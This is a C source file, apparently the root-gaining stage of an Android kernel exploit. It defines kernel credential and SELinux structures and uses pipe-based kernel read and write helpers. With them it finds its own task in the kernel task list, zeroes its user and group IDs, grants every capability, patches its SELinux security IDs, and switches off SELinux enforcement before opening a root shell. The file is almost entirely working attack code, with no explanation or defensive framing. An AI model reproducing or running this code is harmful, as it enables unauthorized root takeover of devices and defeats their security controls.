#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "device.h"

struct list_head
{
    struct list_head *next, *prev;
};

struct plist_node
{
    int prio;
    struct list_head prio_list;
    struct list_head node_list;
};

#define _KERNEL_CAPABILITY_U32S 2
typedef struct kernel_cap_struct
{
    unsigned int cap[_KERNEL_CAPABILITY_U32S];
} kernel_cap_t;

#define u32 unsigned int
struct task_security_struct
{
    u32 osid;           /* SID prior to last execve */
    u32 sid;            /* current SID */
    u32 exec_sid;       /* exec SID */
    u32 create_sid;     /* fscreate SID */
    u32 keycreate_sid;  /* keycreate SID */
    u32 sockcreate_sid; /* fscreate SID */
};

struct rcu_head
{
    struct list_head list;
    void (*func)(void *obj);
    void *arg;
};

struct cred
{
    unsigned int usage;
    unsigned int uid;   /* real UID of the task */
    unsigned int gid;   /* real GID of the task */
    unsigned int suid;  /* saved UID of the task */
    unsigned int sgid;  /* saved GID of the task */
    unsigned int euid;  /* effective UID of the task */
    unsigned int egid;  /* effective GID of the task */
    unsigned int fsuid; /* UID for VFS ops */
    unsigned int fsgid; /* GID for VFS ops */

    unsigned int securebits;      /* SUID-less security management */
    kernel_cap_t cap_inheritable; /* caps our children can inherit */
    kernel_cap_t cap_permitted;   /* caps we're permitted */
    kernel_cap_t cap_effective;   /* caps we can actually use */
    kernel_cap_t cap_bset;        /* capability bounding set */
    kernel_cap_t cap_ambient;     /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char jit_keyring; /* default keyring to attach requested
                     * keys to */
    void *session_keyring;     /* keyring inherited over fork */
    void *process_keyring;     /* keyring private to this process */
    void *thread_keyring;      /* keyring private to this thread */
    void *request_key_auth;    /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void *security; /* subjective LSM security */
#endif
    void *user;          /* real user ID subscription */
    void *user_ns;       /* user_ns the caps and keyrings are relative to. */
    void *group_info;    /* supplementary groups for euid/fsgid */
    struct rcu_head rcu; /* RCU deletion hook */
};

#define TASK_COMM_LEN 16
struct task_list_for_comm
{

    struct list_head cpu_timers[3];

/* process credentials */
#ifdef HAS_PTRACE
    const struct cred *ptracer_cred;
#endif
    const struct cred *real_cred; /* objective and real subjective task
                     * credentials (COW) */
    const struct cred *cred;      /* effective (overridable) subjective task
                     * credentials (COW) */
    char comm[TASK_COMM_LEN];     /* executable name excluding path
                     - access with [gs]et_task_comm (which lock
                       it with task_lock())
                     - initialized normally by setup_new_exec */
};

#define KERNEL_START 0xffffffc000000000
int is_cpu_timer_valid(struct list_head *cpu_timer)
{
    if (cpu_timer->next != cpu_timer->prev)
    {
        return 0;
    }

    if ((unsigned long int)cpu_timer->next < KERNEL_START)
    {
        return 0;
    }

    return 1;
}

int read_at_address_pipe(void *address, void *buf, size_t len)
{
    int ret = 1;
    int pipes[2];

    if (pipe(pipes))
        return 1;

    if (write(pipes[1], address, len) != len)
        goto end;
    if (read(pipes[0], buf, len) != len)
        goto end;

    ret = 0;
end:
    close(pipes[1]);
    close(pipes[0]);
    return ret;
}

int write_at_address_pipe(void *address, void *buf, size_t len)
{
    int ret = 1;
    int pipes[2];

    if (pipe(pipes))
        return 1;

    if (write(pipes[1], buf, len) != len)
        goto end;
    if (read(pipes[0], address, len) != len)
        goto end;

    ret = 0;
end:
    close(pipes[1]);
    close(pipes[0]);
    return ret;
}

int getroot()
{
    size_t init_task = INIT_TASK;

    unsigned int pushable_tasks_value;

    struct list_head init_head;
    size_t *init_head_address;
    unsigned i = 0;

    for (i = 0; i < 0x800; i += sizeof(unsigned int))
    {
        read_at_address_pipe((void *)(init_task + i), &pushable_tasks_value, sizeof(unsigned int));

        if (pushable_tasks_value == 0x8c)
        {
            init_head_address = (void *)(init_task + i - 2 * sizeof(size_t));
            read_at_address_pipe(init_head_address, &init_head, sizeof(init_head));
            break;
        }
    }
    printf("[*] Found the tasks list at 0x%lx\n", (uint64_t)init_head_address);

    struct task_list_for_comm task_for_comm;
    struct task_list_for_comm *task;
    task = &task_for_comm;

    struct list_head *list_head_p;
    int get_exp_comm = 0;
    unsigned long offset = 0;

    struct cred *self_cred;

    list_head_p = &init_head;
    offset = (unsigned long)init_head_address;

    int second_offset = -1;

    while (list_head_p->next != (struct list_head *)init_head_address)
    {
        if (second_offset == -1)
        {
            for (i = 0; i < 0x400; i += sizeof(unsigned int))
            {
                read_at_address_pipe((void *)offset + i, task, sizeof(*task));
                if (is_cpu_timer_valid(&task->cpu_timers[0]) && is_cpu_timer_valid(&task->cpu_timers[1]) && is_cpu_timer_valid(&task->cpu_timers[2]) && task->real_cred == task->cred)
                {
                    second_offset = i;
                    break;
                }
            }
        }

        read_at_address_pipe((void *)offset + second_offset, task, sizeof(*task));
        if (!strcmp(task->comm, "exploit"))
        {
            uint64_t tmpOffset = (uint64_t)offset & 0xfff;
            printf("[*] Found the exploit's task at 0x%lx\n", (uint64_t)offset - tmpOffset);
            self_cred = (struct cred *)task->cred;
            get_exp_comm = 1;
            break;
        }
        if (get_exp_comm)
            break;
        offset = (unsigned long)list_head_p->next;
        read_at_address_pipe(list_head_p->next, list_head_p, sizeof(*list_head_p));
    }

    unsigned long val = 0;
    printf("[*] Patching the cred structure at 0x%lx\n", (uint64_t)self_cred);
    write_at_address_pipe(&self_cred->uid, &val, sizeof(self_cred->uid));
    write_at_address_pipe(&self_cred->gid, &val, sizeof(self_cred->gid));
    write_at_address_pipe(&self_cred->suid, &val, sizeof(self_cred->suid));
    write_at_address_pipe(&self_cred->sgid, &val, sizeof(self_cred->sgid));
    write_at_address_pipe(&self_cred->euid, &val, sizeof(self_cred->euid));
    write_at_address_pipe(&self_cred->egid, &val, sizeof(self_cred->egid));
    write_at_address_pipe(&self_cred->fsuid, &val, sizeof(self_cred->fsuid));
    write_at_address_pipe(&self_cred->fsgid, &val, sizeof(self_cred->fsgid));

    val = -1;
    write_at_address_pipe(&self_cred->cap_inheritable.cap[0], &val, sizeof(self_cred->cap_inheritable.cap[0]));
    write_at_address_pipe(&self_cred->cap_inheritable.cap[1], &val, sizeof(self_cred->cap_inheritable.cap[1]));
    write_at_address_pipe(&self_cred->cap_permitted.cap[0], &val, sizeof(self_cred->cap_permitted.cap[0]));
    write_at_address_pipe(&self_cred->cap_permitted.cap[1], &val, sizeof(self_cred->cap_permitted.cap[1]));
    write_at_address_pipe(&self_cred->cap_effective.cap[0], &val, sizeof(self_cred->cap_effective.cap[0]));
    write_at_address_pipe(&self_cred->cap_effective.cap[1], &val, sizeof(self_cred->cap_effective.cap[1]));
    write_at_address_pipe(&self_cred->cap_bset.cap[0], &val, sizeof(self_cred->cap_bset.cap[0]));
    write_at_address_pipe(&self_cred->cap_bset.cap[1], &val, sizeof(self_cred->cap_bset.cap[1]));
    write_at_address_pipe(&self_cred->cap_ambient.cap[0], &val, sizeof(self_cred->cap_ambient.cap[0]));
    write_at_address_pipe(&self_cred->cap_ambient.cap[1], &val, sizeof(self_cred->cap_ambient.cap[1]));

    uint64_t temp2;
    read_at_address_pipe((void *)&self_cred->security, &temp2, sizeof(uint64_t));
    struct task_security_struct *kernel_self_tss;
    kernel_self_tss = (struct task_security_struct *)temp2;

    printf("[*] Patching the security structure at 0x%lx\n", temp2);
    uint32_t val2;

    val2 = 1;
    write_at_address_pipe((uint32_t *)&kernel_self_tss->osid, (uint32_t *)&val2, sizeof(uint32_t));
    write_at_address_pipe((uint32_t *)&kernel_self_tss->sid, (uint32_t *)&val2, sizeof(uint32_t));

    val2 = 0;
    write_at_address_pipe((uint32_t *)&kernel_self_tss->exec_sid, (uint32_t *)&val2, sizeof(uint32_t));
    write_at_address_pipe((uint32_t *)&kernel_self_tss->create_sid, (uint32_t *)&val2, sizeof(uint32_t));
    write_at_address_pipe((uint32_t *)&kernel_self_tss->keycreate_sid, (uint32_t *)&val2, sizeof(uint32_t));
    write_at_address_pipe((uint32_t *)&kernel_self_tss->sockcreate_sid, (uint32_t *)&val2, sizeof(uint32_t));

    printf("[*] Patching selinux_enabled and selinux_enforcing\n");
    uint32_t *selinux_enabled = (uint32_t *)SELINUX_ENABLED;
    uint32_t *selinux_enforcing = (uint32_t *)SELINUX_ENFORCING;
    val = 0;

    write_at_address_pipe((uint32_t *)selinux_enabled, &val, sizeof(uint32_t));
    write_at_address_pipe((uint32_t *)selinux_enforcing, &val, sizeof(uint32_t));

    printf("[*] Got root\n");
    return system("/system/bin/sh");
}
